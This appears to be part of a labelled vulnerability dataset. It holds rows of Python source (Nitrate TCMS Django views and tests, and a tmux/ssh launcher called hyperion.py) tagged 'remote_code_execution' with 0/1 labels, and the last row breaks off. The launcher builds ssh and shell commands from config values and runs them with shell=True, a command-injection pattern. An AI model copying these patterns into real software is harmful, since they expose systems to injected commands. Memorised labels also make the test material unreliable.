        return (None, 'Please specify only integers for bugs, '
                      'caseruns(using comma to seperate IDs), '
                      'and bug_system. (DEBUG INFO: %s)' % str(e))

    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))

    if request.GET.get('a') not in ('add', 'remove'):
        return (None, 'Actions only allow ""add"" and ""remove"".')
    else:
        data['action'] = request.GET.get('a')
    data['bz_external_track'] = True if request.GET.get('bz_external_track',
                                                        False) else False

    return (data, '')


def update_bugs_to_caseruns(request):
    """"""
    Add one or more bugs to or remove that from\n
    one or more caserun at a time.
    """"""
    data, error = clean_bug_form(request)
    if error:
        return say_no(error)
    runs = TestCaseRun.objects.filter(pk__in=data['runs'])
    bug_system_id = data['bug_system_id']
    bug_ids = data['bugs']

    try:
        validate_bug_id(bug_ids, bug_system_id)
    except ValidationError as e:
        return say_no(str(e))

    bz_external_track = data['bz_external_track']
    action = data['action']
    try:
        if action == ""add"":
            for run in runs:
                for bug_id in bug_ids:
                    run.add_bug(bug_id=bug_id,
                                bug_system_id=bug_system_id,
                                bz_external_track=bz_external_track)
        else:
            bugs = Bug.objects.filter(bug_id__in=bug_ids)
            for run in runs:
                for bug in bugs:
                    if bug.case_run_id == run.pk:
                        run.remove_bug(bug.bug_id, run.pk)
    except Exception as e:
        return say_no(str(e))
    return say_yes()


def get_prod_related_objs(p_pks, target):
    """"""
    Get Component, Version, Category, and Build\n
    Return [(id, name), (id, name)]
    """"""
    ctypes = {
        'component': (Component, 'name'),
        'version': (Version, 'value'),
        'build': (Build, 'name'),
        'category': (Category, 'name'),
    }
    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)
    attr = ctypes[target][1]
    results = [(r.pk, getattr(r, attr)) for r in results]
    return results


def get_prod_related_obj_json(request):
    """"""
    View for updating product drop-down\n
    in a Ajax way.
    """"""
    data = request.GET.copy()
    target = data.get('target', None)
    p_pks = data.get('p_ids', None)
    sep = data.get('sep', None)
    # py2.6: all(*values) => boolean ANDs
    if target and p_pks and sep:
        p_pks = [k for k in p_pks.split(sep) if k]
        res = get_prod_related_objs(p_pks, target)
    else:
        res = []
    return HttpResponse(json.dumps(res))


def objects_update(objects, **kwargs):
    objects.update(**kwargs)
    kwargs['instances'] = objects
    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(
            'case_run_status', None):
        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)
/n/n/n/tcms/core/tests/test_views.py/n/n# -*- coding: utf-8 -*-

import json
from http import HTTPStatus
from urllib.parse import urlencode

from django import test
from django.conf import settings
from django.contrib.contenttypes.models import ContentType
from django.core import serializers
from django.urls import reverse
from django_comments.models import Comment

from tcms.management.models import Priority
from tcms.management.models import EnvGroup
from tcms.management.models import EnvProperty
from tcms.testcases.forms import CaseAutomatedForm
from tcms.testcases.forms import TestCase
from tcms.testplans.models import TestPlan
from tcms.testruns.models import TestCaseRun
from tcms.testruns.models import TestCaseRunStatus
from tcms.tests import BaseCaseRun
from tcms.tests import BasePlanCase
from tcms.tests import remove_perm_from_user
from tcms.tests import user_should_have_perm
from tcms.tests.factories import UserFactory
from tcms.tests.factories import EnvGroupFactory
from tcms.tests.factories import EnvGroupPropertyMapFactory
from tcms.tests.factories import EnvPropertyFactory


class TestNavigation(test.TestCase):
    @classmethod
    def setUpTestData(cls):
        super(TestNavigation, cls).setUpTestData()
        cls.user = UserFactory(email='user+1@example.com')
        cls.user.set_password('testing')
        cls.user.save()

    def test_urls_for_emails_with_pluses(self):
        # test for https://github.com/Nitrate/Nitrate/issues/262
        # when email contains + sign it needs to be properly urlencoded
        # before passing it as query string argument to the search views
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.user.username,
            password='testing')
        response = self.client.get(reverse('iframe-navigation'))

        self.assertContains(response, urlencode({'people': self.user.email}))
        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))


class TestIndex(BaseCaseRun):
    def test_when_not_logged_in_index_page_redirects_to_login(self):
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-login'),
            target_status_code=HTTPStatus.OK)

    def test_when_logged_in_index_page_redirects_to_dashboard(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-recent', args=[self.tester.username]),
            target_status_code=HTTPStatus.OK)


class TestCommentCaseRuns(BaseCaseRun):
    """"""Test case for ajax.comment_case_runs""""""

    @classmethod
    def setUpTestData(cls):
        super(TestCommentCaseRuns, cls).setUpTestData()
        cls.many_comments_url = reverse('ajax-comment_case_runs')

    def test_refuse_if_missing_comment(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Comments needed'})

    def test_refuse_if_missing_no_case_run_pk(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment', 'run': []})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

    def test_refuse_if_passed_case_run_pks_not_exist(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment',
                                     'run': '99999998,1009900'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No caserun found.'})

    def test_add_comment_to_case_runs(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        new_comment = 'new comment'
        response = self.client.post(
            self.many_comments_url,
            {'comment': new_comment,
             'run': ','.join([str(self.case_run_1.pk),
                              str(self.case_run_2.pk)])})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        # Assert comments are added
        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)

        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):
            comments = Comment.objects.filter(object_pk=case_run_pk,
                                              content_type=case_run_ct)
            self.assertEqual(new_comment, comments[0].comment)
            self.assertEqual(self.tester, comments[0].user)


class TestUpdateObject(BasePlanCase):
    """"""Test case for update""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateObject, cls).setUpTestData()

        cls.permission = 'testplans.change_testplan'
        cls.update_url = reverse('ajax-update')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        remove_perm_from_user(self.tester, self.permission)

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_update_plan_is_active(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        plan = TestPlan.objects.get(pk=self.plan.pk)
        self.assertFalse(plan.is_active)


class TestUpdateCaseRunStatus(BaseCaseRun):
    """"""Test case for update_case_run_status""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCaseRunStatus, cls).setUpTestData()

        cls.permission = 'testruns.change_testcaserun'
        cls.update_url = reverse('ajax-update_case_run_status')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_change_case_run_status(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        self.assertEqual(
            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)


class TestGetForm(test.TestCase):
    """"""Test case for form""""""

    def test_get_form(self):
        response = self.client.get(reverse('ajax-form'),
                                   {'app_form': 'testcases.CaseAutomatedForm'})
        form = CaseAutomatedForm()
        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())


class TestUpdateCasePriority(BasePlanCase):
    """"""Test case for update_cases_default_tester""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCasePriority, cls).setUpTestData()

        cls.permission = 'testcases.change_testcase'
        cls.case_update_url = reverse('ajax-update_cases_default_tester')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': ""You don't have enough permission to ""
                                  ""update TestCases.""})

    def test_update_case_priority(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        for pk in (self.case_1.pk, self.case_3.pk):
            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)


class TestGetObjectInfo(BasePlanCase):
    """"""Test case for info view method""""""

    @classmethod
    def setUpTestData(cls):
        super(TestGetObjectInfo, cls).setUpTestData()

        cls.get_info_url = reverse('ajax-info')

        cls.group_nitrate = EnvGroupFactory(name='nitrate')
        cls.group_new = EnvGroupFactory(name='NewGroup')

        cls.property_os = EnvPropertyFactory(name='os')
        cls.property_python = EnvPropertyFactory(name='python')
        cls.property_django = EnvPropertyFactory(name='django')

        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_os)
        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_python)
        EnvGroupPropertyMapFactory(group=cls.group_new,
                                   property=cls.property_django)

    def test_get_env_properties(self):
        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})

        expected_json = json.loads(
            serializers.serialize(
                'json',
                EnvProperty.objects.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)

    def test_get_env_properties_by_group(self):
        response = self.client.get(self.get_info_url,
                                   {'info_type': 'env_properties',
                                    'env_group_id': self.group_new.pk})

        group = EnvGroup.objects.get(pk=self.group_new.pk)
        expected_json = json.loads(
            serializers.serialize(
                'json',
                group.property.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)
/n/n/n",1,remote_code_execution
8,4,269b8c87afc149911af3ae63b3ccbfc77ffb223d,"hyperion/hyperion.py/n/n#! /usr/bin/env python
from libtmux import Server
from yaml import load, dump
from setupParser import Loader
from DepTree import Node, dep_resolve, CircularReferenceException
import logging
import os
import socket
import argparse
from psutil import Process
from subprocess import call
from graphviz import Digraph
from enum import Enum
from time import sleep

import sys
from PyQt4 import QtGui
import hyperGUI

FORMAT = ""%(asctime)s: %(name)s [%(levelname)s]:\t%(message)s""

logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')
TMP_SLAVE_DIR = ""/tmp/Hyperion/slave/components""
TMP_COMP_DIR = ""/tmp/Hyperion/components""
TMP_LOG_PATH = ""/tmp/Hyperion/log""

BASE_DIR = os.path.dirname(__file__)
SCRIPT_CLONE_PATH = (""%s/scripts/start_named_clone_session.sh"" % BASE_DIR)


class CheckState(Enum):
    RUNNING = 0
    STOPPED = 1
    STOPPED_BUT_SUCCESSFUL = 2
    STARTED_BY_HAND = 3
    DEP_FAILED = 4


class ControlCenter:

    def __init__(self, configfile=None):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.configfile = configfile
        self.nodes = {}
        self.server = []
        self.host_list = []

        if configfile:
            self.load_config(configfile)
            self.session_name = self.config[""name""]

            # Debug write resulting yaml file
            with open('debug-result.yml', 'w') as outfile:
                dump(self.config, outfile, default_flow_style=False)
            self.logger.debug(""Loading config was successful"")

            self.server = Server()

            if self.server.has_session(self.session_name):
                self.session = self.server.find_where({
                    ""session_name"": self.session_name
                })

                self.logger.info('found running session by name ""%s"" on server' % self.session_name)
            else:
                self.logger.info('starting new session by name ""%s"" on server' % self.session_name)
                self.session = self.server.new_session(
                    session_name=self.session_name,
                    window_name=""Main""
                )
        else:
            self.config = None

    ###################
    # Setup
    ###################
    def load_config(self, filename=""default.yaml""):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")

        else:
            for group in self.config['groups']:
                for comp in group['components']:
                    self.logger.debug(""Checking component '%s' in group '%s' on host '%s'"" %
                                      (comp['name'], group['name'], comp['host']))

                    if comp['host'] != ""localhost"" and not self.run_on_localhost(comp):
                        self.copy_component_to_remote(comp, comp['name'], comp['host'])

            # Remove duplicate hosts
            self.host_list = list(set(self.host_list))

            self.set_dependencies(True)

    def set_dependencies(self, exit_on_fail):
        for group in self.config['groups']:
            for comp in group['components']:
                self.nodes[comp['name']] = Node(comp)

        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all
        # nodes with simple algorithms
        master_node = Node({'name': 'master_node'})
        for name in self.nodes:
            node = self.nodes.get(name)

            # Add edges from each node to pseudo node
            master_node.addEdge(node)

            # Add edges based on dependencies specified in the configuration
            if ""depends"" in node.component:
                for dep in node.component['depends']:
                    if dep in self.nodes:
                        node.addEdge(self.nodes[dep])
                    else:
                        self.logger.error(""Unmet dependency: '%s' for component '%s'!"" % (dep, node.comp_name))
                        if exit_on_fail:
                            exit(1)
        self.nodes['master_node'] = master_node

        # Test if starting all components is possible
        try:
            node = self.nodes.get('master_node')
            res = []
            unres = []
            dep_resolve(node, res, unres)
            dep_string = """"
            for node in res:
                if node is not master_node:
                    dep_string = ""%s -> %s"" % (dep_string, node.comp_name)
            self.logger.debug(""Dependency tree for start all: %s"" % dep_string)
        except CircularReferenceException as ex:
            self.logger.error(""Detected circular dependency reference between %s and %s!"" % (ex.node1, ex.node2))
            if exit_on_fail:
                exit(1)

    def copy_component_to_remote(self, infile, comp, host):
        self.host_list.append(host)

        self.logger.debug(""Saving component to tmp"")
        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))
        ensure_dir(tmp_comp_path)
        with open(tmp_comp_path, 'w') as outfile:
            dump(infile, outfile, default_flow_style=False)

        self.logger.debug('Copying component ""%s"" to remote host ""%s""' % (comp, host))
        cmd = (""ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml"" %
               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))
        self.logger.debug(cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Stop
    ###################
    def stop_component(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug(""Stopping remote component '%s' on host '%s'"" % (comp['name'], comp['host']))
            self.stop_remote_component(comp['name'], comp['host'])
        else:
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug(""window '%s' found running"" % comp['name'])
                self.logger.info(""Shutting down window..."")
                kill_window(window)
                self.logger.info(""... done!"")

    def stop_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = (""ssh %s 'hyperion --config %s/%s.yaml slave --kill'"" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug(""Run cmd:\n%s"" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Start
    ###################
    def start_component(self, comp):

        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        for node in res:
            self.logger.debug(""node name '%s' vs. comp name '%s'"" % (node.comp_name, comp['name']))
            if node.comp_name != comp['name']:
                self.logger.debug(""Checking and starting %s"" % node.comp_name)
                state = self.check_component(node.component)
                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or
                        state is CheckState.STARTED_BY_HAND or
                        state is CheckState.RUNNING):
                    self.logger.debug(""Component %s is already running, skipping to next in line"" % comp['name'])
                else:
                    self.logger.debug(""Start component '%s' as dependency of '%s'"" % (node.comp_name, comp['name']))
                    self.start_component_without_deps(node.component)

                    tries = 0
                    while True:
                        self.logger.debug(""Checking %s resulted in checkstate %s"" % (node.comp_name, state))
                        state = self.check_component(node.component)
                        if (state is not CheckState.RUNNING or
                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):
                            break
                        if tries > 100:
                            return False
                        tries = tries + 1
                        sleep(.5)

        self.logger.debug(""All dependencies satisfied, starting '%s'"" % (comp['name']))
        state = self.check_component(node.component)
        if (state is CheckState.STARTED_BY_HAND or
                state is CheckState.RUNNING):
            self.logger.debug(""Component %s is already running. Skipping start"" % comp['name'])
        else:
            self.start_component_without_deps(comp)
        return True

    def start_component_without_deps(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug(""Starting remote component '%s' on host '%s'"" % (comp['name'], comp['host']))
            self.start_remote_component(comp['name'], comp['host'])
        else:
            log_file = (""%s/%s"" % (TMP_LOG_PATH, comp['name']))
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug(""Restarting '%s' in old window"" % comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])
            else:
                self.logger.info(""creating window '%s'"" % comp['name'])
                window = self.session.new_window(comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])

    def start_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = (""ssh %s 'hyperion --config %s/%s.yaml slave'"" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug(""Run cmd:\n%s"" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Check
    ###################
    def check_component(self, comp):
        if self.run_on_localhost(comp):
            return check_component(comp, self.session, self.logger)
        else:
            self.logger.debug(""Starting remote check"")
            cmd = ""ssh %s 'hyperion --config %s/%s.yaml slave -c'"" % (comp['host'], TMP_SLAVE_DIR, comp['name'])
            ret = call(cmd, shell=True)
            return CheckState(ret)

    ###################
    # Dependency management
    ###################
    def get_dep_list(self, comp):
        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        res.remove(node)

        return res

    ###################
    # Host related checks
    ###################
    def is_localhost(self, hostname):
        try:
            hn_out = socket.gethostbyname(hostname)
            if hn_out == '127.0.0.1' or hn_out == '::1':
                self.logger.debug(""Host '%s' is localhost"" % hostname)
                return True
            else:
                self.logger.debug(""Host '%s' is not localhost"" % hostname)
                return False
        except socket.gaierror:
            sys.exit(""Host '%s' is unknown! Update your /etc/hosts file!"" % hostname)

    def run_on_localhost(self, comp):
        return self.is_localhost(comp['host'])

    ###################
    # TMUX
    ###################
    def kill_remote_session_by_name(self, name, host):
        cmd = ""ssh -t %s 'tmux kill-session -t %s'"" % (host, name)
        send_main_session_command(self.session, cmd)

    def start_clone_session(self, comp_name, session_name):
        cmd = ""%s '%s' '%s'"" % (SCRIPT_CLONE_PATH, session_name, comp_name)
        send_main_session_command(self.session, cmd)

    def start_remote_clone_session(self, comp_name, session_name, hostname):
        remote_cmd = (""%s '%s' '%s'"" % (SCRIPT_CLONE_PATH, session_name, comp_name))
        cmd = ""ssh %s 'bash -s' < %s"" % (hostname, remote_cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Visualisation
    ###################
    def draw_graph(self):
        deps = Digraph(""Deps"", strict=True)
        deps.graph_attr.update(rankdir=""BT"")
        try:
            node = self.nodes.get('master_node')

            for current in node.depends_on:
                deps.node(current.comp_name)

                res = []
                unres = []
                dep_resolve(current, res, unres)
                for node in res:
                    if ""depends"" in node.component:
                        for dep in node.component['depends']:
                            if dep not in self.nodes:
                                deps.node(dep, color=""red"")
                                deps.edge(node.comp_name, dep, ""missing"", color=""red"")
                            elif node.comp_name is not ""master_node"":
                                deps.edge(node.comp_name, dep)

        except CircularReferenceException as ex:
            self.logger.error(""Detected circular dependency reference between %s and %s!"" % (ex.node1, ex.node2))
            deps.edge(ex.node1, ex.node2, ""circular error"", color=""red"")
            deps.edge(ex.node2, ex.node1, color=""red"")

        deps.view()


class SlaveLauncher:

    def __init__(self, configfile=None, kill_mode=False, check_mode=False):
        self.kill_mode = kill_mode
        self.check_mode = check_mode
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.config = None
        self.session = None
        if kill_mode:
            self.logger.info(""started slave with kill mode"")
        if check_mode:
            self.logger.info(""started slave with check mode"")
        self.server = Server()

        if self.server.has_session(""slave-session""):
            self.session = self.server.find_where({
                ""session_name"": ""slave-session""
            })

            self.logger.info('found running slave session on server')
        elif not kill_mode and not check_mode:
            self.logger.info('starting new slave session on server')
            self.session = self.server.new_session(
                session_name=""slave-session""
            )

        else:
            self.logger.info(""No slave session found on server. Aborting"")
            exit(CheckState.STOPPED)

        if configfile:
            self.load_config(configfile)
            self.window_name = self.config['name']
            self.flag_path = (""/tmp/Hyperion/slaves/%s"" % self.window_name)
            self.log_file = (""/tmp/Hyperion/log/%s"" % self.window_name)
            ensure_dir(self.log_file)
        else:
            self.logger.error(""No slave component config provided"")

    def load_config(self, filename=""default.yaml""):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")
        elif not self.session:
            self.logger.error("" Init aborted. No session was found!"")
        else:
            self.logger.debug(self.config)
            window = find_window(self.session, self.window_name)

            if window:
                self.logger.debug(""window '%s' found running"" % self.window_name)
                if self.kill_mode:
                    self.logger.info(""Shutting down window..."")
                    kill_window(window)
                    self.logger.info(""... done!"")
            elif not self.kill_mode:
                self.logger.info(""creating window '%s'"" % self.window_name)
                window = self.session.new_window(self.window_name)
                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)

            else:
                self.logger.info(""There is no component running by the name '%s'. Exiting kill mode"" %
                                 self.window_name)

    def run_check(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")
            exit(CheckState.STOPPED.value)
        elif not self.session:
            self.logger.error("" Init aborted. No session was found!"")
            exit(CheckState.STOPPED.value)

        check_state = check_component(self.config, self.session, self.logger)
        exit(check_state.value)

###################
# Component Management
###################
def run_component_check(comp):
    if call(comp['cmd'][1]['check'], shell=True) == 0:
        return True
    else:
        return False


def check_component(comp, session, logger):
    logger.debug(""Running component check for %s"" % comp['name'])
    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]
    window = find_window(session, comp['name'])
    if window:
        pid = get_window_pid(window)
        logger.debug(""Found window pid: %s"" % pid)

        # May return more child pids if logging is done via tee (which then was started twice in the window too)
        procs = []
        for entry in pid:
            procs.extend(Process(entry).children(recursive=True))
        pids = [p.pid for p in procs]
        logger.debug(""Window is running %s child processes"" % len(pids))

        # TODO: Investigate minimum process number on hosts
        # TODO: Change this when more logging options are introduced
        if len(pids) < 2:
            logger.debug(""Main window process has finished. Running custom check if available"")
            if check_available and run_component_check(comp):
                logger.debug(""Process terminated but check was successful"")
                return CheckState.STOPPED_BUT_SUCCESSFUL
            else:
                logger.debug(""Check failed or no check available: returning false"")
                return CheckState.STOPPED
        elif check_available and run_component_check(comp):
            logger.debug(""Check succeeded"")
            return CheckState.RUNNING
        elif not check_available:
            logger.debug(""No custom check specified and got sufficient pid amount: returning true"")
            return CheckState.RUNNING
        else:
            logger.debug(""Check failed: returning false"")
            return CheckState.STOPPED
    else:
        logger.debug(""%s window is not running. Running custom check"" % comp['name'])
        if check_available and run_component_check(comp):
            logger.debug(""Component was not started by Hyperion, but the check succeeded"")
            return CheckState.STARTED_BY_HAND
        else:
            logger.debug(""Window not running and no check command is available or it failed: returning false"")
            return CheckState.STOPPED


def get_window_pid(window):
    r = window.cmd('list-panes',
                   ""-F #{pane_pid}"")
    return [int(p) for p in r.stdout]

###################
# TMUX
###################
def kill_session_by_name(server, name):
    session = server.find_where({
        ""session_name"": name
    })
    session.kill_session()


def kill_window(window):
    window.cmd(""send-keys"", """", ""C-c"")
    window.kill_window()


def start_window(window, cmd, log_file, comp_name):
    setup_log(window, log_file, comp_name)
    window.cmd(""send-keys"", cmd, ""Enter"")


def find_window(session, window_name):
    window = session.find_where({
        ""window_name"": window_name
    })
    return window


def send_main_session_command(session, cmd):
    window = find_window(session, ""Main"")
    window.cmd(""send-keys"", cmd, ""Enter"")

###################
# Logging
###################
def setup_log(window, file, comp_name):
    clear_log(file)
    # Reroute stderr to log file
    window.cmd(""send-keys"", ""exec 2> >(exec tee -i -a '%s')"" % file, ""Enter"")
    # Reroute stdin to log file
    window.cmd(""send-keys"", ""exec 1> >(exec tee -i -a '%s')"" % file, ""Enter"")
    window.cmd(""send-keys"", ('echo ""#Hyperion component start: %s\n$(date)""' % comp_name), ""Enter"")


def clear_log(file_path):
    if os.path.isfile(file_path):
        os.remove(file_path)


def ensure_dir(file_path):
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)

###################
# Startup
###################
def main():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser()

    # Create top level parser
    parser.add_argument(""--config"", '-c', type=str,
                        default='test.yaml',
                        help=""YAML config file. see sample-config.yaml. Default: test.yaml"")
    subparsers = parser.add_subparsers(dest=""cmd"")

    # Create parser for the editor command
    subparser_editor = subparsers.add_parser('edit', help=""Launches the editor to edit or create new systems and ""
                                                          ""components"")
    # Create parser for the run command
    subparser_run = subparsers.add_parser('run', help=""Launches the setup specified by the --config argument"")
    # Create parser for validator
    subparser_val = subparsers.add_parser('validate', help=""Validate the setup specified by the --config argument"")

    subparser_remote = subparsers.add_parser('slave', help=""Run a component locally without controlling it. The ""
                                                           ""control is taken care of the remote master invoking ""
                                                           ""this command.\nIf run with the --kill flag, the ""
                                                           ""passed component will be killed"")

    subparser_val.add_argument(""--visual"", help=""Generate and show a graph image"", action=""store_true"")

    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)

    remote_mutex.add_argument('-k', '--kill', help=""switch to kill mode"", action=""store_true"")
    remote_mutex.add_argument('-c', '--check', help=""Run a component check"", action=""store_true"")

    args = parser.parse_args()
    logger.debug(args)

    if args.cmd == 'edit':
        logger.debug(""Launching editor mode"")

    elif args.cmd == 'run':
        logger.debug(""Launching runner mode"")

        cc = ControlCenter(args.config)
        cc.init()
        start_gui(cc)

    elif args.cmd == 'validate':
        logger.debug(""Launching validation mode"")
        cc = ControlCenter(args.config)
        if args.visual:
            cc.set_dependencies(False)
            cc.draw_graph()
        else:
            cc.set_dependencies(True)

    elif args.cmd == 'slave':
        logger.debug(""Launching slave mode"")
        sl = SlaveLauncher(args.config, args.kill, args.check)

        if args.check:
            sl.run_check()
        else:
            sl.init()


###################
# GUI
###################
def start_gui(control_center):
    app = QtGui.QApplication(sys.argv)
    main_window = QtGui.QMainWindow()
    ui = hyperGUI.UiMainWindow()
    ui.ui_init(main_window, control_center)
    main_window.show()
    sys.exit(app.exec_())
/n/n/n",0,remote_code_execution
9,5,269b8c87afc149911af3ae63b3ccbfc77ffb223d,"/hyperion/hyperion.py/n/n#! /usr/bin/env python
from libtmux import Server
from yaml import load, dump
from setupParser import Loader
from DepTree import Node, dep_resolve, CircularReferenceException
import logging
import os
import socket
import argparse
from psutil import Process
from subprocess import call
from graphviz import Digraph
from enum import Enum
from time import sleep

import sys
from PyQt4 import QtGui
import hyperGUI

FORMAT = ""%(asctime)s: %(name)s [%(levelname)s]:\t%(message)s""

logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')
TMP_SLAVE_DIR = ""/tmp/Hyperion/slave/components""
TMP_COMP_DIR = ""/tmp/Hyperion/components""
TMP_LOG_PATH = ""/tmp/Hyperion/log""

BASE_DIR = os.path.dirname(__file__)
